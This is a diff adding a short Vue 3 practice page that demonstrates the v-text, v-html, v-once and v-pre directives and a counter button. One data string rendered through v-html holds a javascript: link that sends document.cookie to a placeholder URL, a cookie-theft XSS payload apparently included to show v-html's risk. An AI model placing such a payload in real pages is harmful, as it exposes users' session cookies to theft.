@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
+</head>
+<body>
+        <div id="root">
+            <span v-text="message"></span>
+            <span v-html="str"></span>
+            <span v-html="str1"></span>
+            <hr>
+            <span v-once>init value of n :{{n}}</span> <br>
+            <span>current value of n： {{n}}</span> <br>
+            <button @click="n++">n++</button>
+            <br>
+            <span v-pre>{{this will not be complied}}</span>
+        </div>
+<script>
+    const app = Vue.createApp({
+        data(){
+            return{
+                message:"hello,jasper",
+                str:"<h2> hello v-html</h2>",
+                str1:"<a href=javascript:location.href='http:/test?'+document.cookie>懂得都懂</a>",
+                n:1
+            }
+        },
+        computed:{
+
+        },
+        methods:{
+
+        }
+
+    })
+    app.mount("#root")
+</script>
+</body>
+</html>
